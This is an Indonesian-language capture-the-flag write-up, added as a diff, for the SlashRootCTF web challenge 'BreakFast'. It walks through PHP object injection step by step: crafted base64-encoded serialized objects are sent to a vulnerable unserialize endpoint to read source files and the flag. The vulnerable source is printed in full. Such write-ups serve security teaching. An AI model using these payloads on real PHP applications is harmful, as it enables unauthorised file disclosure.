@@ -1,0 +1,98 @@
+
+
+~ BreakFast ~ Web ~ SlashRootCTF (75pts)
+
+Kali ini soal web hacking, diberikan sebuah link http://103.200.7.150:9080/ didalam
+web tersebut diberikan sebauh pilihan2 example code php. Ada contoh code php menampilkan
+hello world, dengan variable dan dengan for loop. ketika kita memilih misalnya yg hello
+world kita diarah kan link yang berisi scrip hello world. contoh link nya :
+
+ramdhan@n0psledbyt3:~/slashroot$ curl http://103.200.7.150:9080/process.php?code=
+Tzo4OiJFeGVyY2lzZSI6MTp7czo0OiJmaWxlIjtzOjE1OiJoZWxsb193b3JsZC5waHAiO30%3D
+
+<code><span style="color: #000000">
+<span style="color: #0000BB">
+&lt;?php<br />
+</span><span style="color: #007700">
+echo&nbsp;</span><span style="color: #DD0000">"Hello&nbsp;World!"</span><span style="color: #007700">;<br />
+</span><span style="color: #0000BB">?&gt;</span>
+</span>
+</code>
+
+Atau jika ditampilkan dibrowser seperti :
+
+----------------------
+<?php
+echo "Hello World!";
+?>
+---------------------
+*dengan highlight code
+
+Saya penasaran dengan variable code di get yaitu:
+Tzo4OiJFeGVyY2lzZSI6MTp7czo0OiJmaWxlIjtzOjE1OiJoZWxsb193b3JsZC5waHAiO30%3D
+
+Ini merupakan base64 dan saya decode
+
+ramdhan@n0psledbyt3:~/slashroot$ echo Tzo4OiJFeGVyY2lzZSI6MTp7czo0OiJmaWxlIjtzOjE1OiJoZWxsb193b3JsZC5waHAiO30= | base64 -d
+O:8:"Exercise":1:{s:4:"file";s:15:"hello_world.php";}
+
+Hasil decode menghasilkan object dalam bentuk unserialized, web ini mempunyai kelemahan "Object Injection"
+kita bisa mengubah2 data ini dan mengirimnya ke variable kode di get. Sekarang kita coba 
+menampilkan source code file process.php
+
+ramdhan@n0psledbyt3:~/slashroot$ echo "O:8:\"Exercise\":1:{s:4:\"file\";s:11:\"process.php\";}" | base64
+Tzo4OiJFeGVyY2lzZSI6MTp7czo0OiJmaWxlIjtzOjExOiJwcm9jZXNzLnBocCI7fQo=
+
+Nah, hasil encode base64 ini masukkan ke variable code di process.php:
+http://103.200.7.150:9080/process.php?code=Tzo4OiJFeGVyY2lzZSI6MTp7czo0OiJmaWxlIjtzOjExOiJwcm9jZXNzLnBocCI7fQo%3D
+
+Jika diakses melalui browser akan menghasilkan:
+
+-----------------------------------------------------------
+<?php
+
+class Flag{
+    public $myFile = "not_flag.php";
+    public function __toString(){
+        return highlight_file($this->myFile, true);
+    }
+}
+
+class Exercise{
+    public $file = "hello_world.php";
+    public function __toString(){
+        return highlight_file($this->file, true);
+    }
+}
+
+$code = base64_decode($_GET['code']);
+if(strpos($code, "Exercise") && strpos($code, "flag.php")){
+    echo "No no no!";
+}else{
+    echo unserialize($code);
+}
+
+?> 
+-----------------------------------------------------------
+
+Tuh keliatankan sourcenya, sekarang kita modifikasi lagi inputan kita,
+nama class diubah menjadi "Flag", variable menjadi "myFile" dan variable "myFile" berisi flag.php
+sehingga menjadi: "O:4:"Flag":1:{s:6:"myFile";s:8:"flag.php";}"
+
+Terus encode menjadi base64 menjadi:
+Tzo0OiJGbGFnIjoxOntzOjY6Im15RmlsZSI7czo4OiJmbGFnLnBocCI7fQo=
+
+dan akses masukkan ke variable kode:
+http://103.200.7.150:9080/process.php?code=Tzo0OiJGbGFnIjoxOntzOjY6Im15RmlsZSI7czo4OiJmbGFnLnBocCI7fQo%3D
+
+Jika dibuka di browser akan menghasilkan :
+----------------------------------------------------------------
+<?php
+$flag = "The special one ... hello flag, ";
+$flag .= "SlashRootCTF{serialization_in_a_nutshell}";
+//echo $flag;
+echo "It's secret, we won't tell you the inside of this file!";
+?> 
+----------------------------------------------------------------
+
+Flag : "SlashRootCTF{serialization_in_a_nutshell}"
